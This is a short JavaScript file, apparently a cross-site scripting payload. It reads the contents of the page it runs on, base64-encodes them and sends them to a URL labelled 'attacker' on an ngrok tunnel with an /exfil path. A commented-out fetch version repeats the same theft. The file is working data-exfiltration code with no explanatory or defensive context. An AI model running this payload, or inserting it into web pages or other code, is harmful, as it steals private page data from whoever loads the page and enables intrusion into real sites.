var url = document.location;
var attacker = "https://d0c2-180-248-4-222.ngrok-free.app/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);

// fetch(url).then(res => res.text()).then(data => {
//     fetch(attacker + "?" + encodeURI(btoa(data)))
// })
